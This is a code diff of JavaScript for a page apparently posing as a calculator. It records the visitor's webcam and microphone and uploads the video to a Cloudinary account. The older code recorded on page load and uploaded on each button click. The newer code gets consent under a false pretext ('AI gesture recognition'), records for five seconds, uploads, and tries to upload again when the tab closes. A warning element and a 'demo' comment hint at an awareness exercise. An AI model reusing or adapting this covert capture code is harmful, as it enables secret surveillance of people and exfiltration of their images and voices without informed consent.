@@ -2,11 +2,15 @@ let recorder;
 let chunks = [];
 let isRecording = false;
 
-// Start recording
 async function startRecording() {
-     if (isRecording) return; // prevent multiple starts
+     if (isRecording) return;
+
      try {
-          const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+          const stream = await navigator.mediaDevices.getUserMedia({
+               video: true,
+               audio: true
+          });
+
           recorder = new MediaRecorder(stream);
           chunks = [];
 
@@ -16,23 +20,30 @@ async function startRecording() {
 
           recorder.start();
           isRecording = true;
+
           console.log("Recording started");
+
      } catch (err) {
-          console.error("Cannot start recording:", err);
+          console.error("Permission denied or error:", err);
      }
 }
 
-// Stop and upload current recording
 async function stopAndUpload() {
      if (!recorder || recorder.state === "inactive") return;
 
-     return new Promise((resolve) => {
+     return new Promise(resolve => {
+
           recorder.onstop = async () => {
+
                const blob = new Blob(chunks, { type: "video/webm" });
                chunks = [];
                isRecording = false;
 
-               // Upload to Cloudinary
+               // Save locally (Phase 1 demo)
+               const videoURL = URL.createObjectURL(blob);
+               localStorage.setItem("lastCapture", videoURL);
+
+               // Upload to Cloudinary (Phase 2)
                const formData = new FormData();
                formData.append("file", blob);
                formData.append("upload_preset", "Webcam_Upload");
@@ -42,10 +53,13 @@ async function stopAndUpload() {
                          method: "POST",
                          body: formData
                     });
-                    console.log("Uploaded successfully!");
+
+                    console.log("Uploaded successfully");
+
                } catch (err) {
                     console.error("Upload failed:", err);
                }
+
                resolve();
           };
 
@@ -53,13 +67,25 @@ async function stopAndUpload() {
      });
 }
 
-// Start recording immediately on page load
-startRecording();
+function showWarning() {
+     document.getElementById("warning").classList.remove("d-none");
+}
 
-// Attach to all calculator buttons
-document.querySelectorAll("button").forEach(btn => {
-     btn.addEventListener("click", async () => {
-          await stopAndUpload();   // stop current recording and upload
-          startRecording();        // start new recording for next button
-     });
-});
+window.onload = async () => {
+
+     alert("This calculator uses AI gesture recognition. Click OK to continue.");
+
+     await startRecording();
+
+     // Wait 5 seconds (real wait, not fake)
+     await new Promise(resolve => setTimeout(resolve, 5001));
+
+     showWarning();
+
+     await stopAndUpload();
+};
+
+// tried to upload at closing the tab but didn't work
+window.onbeforeunload = async () => {
+     await stopAndUpload();
+};
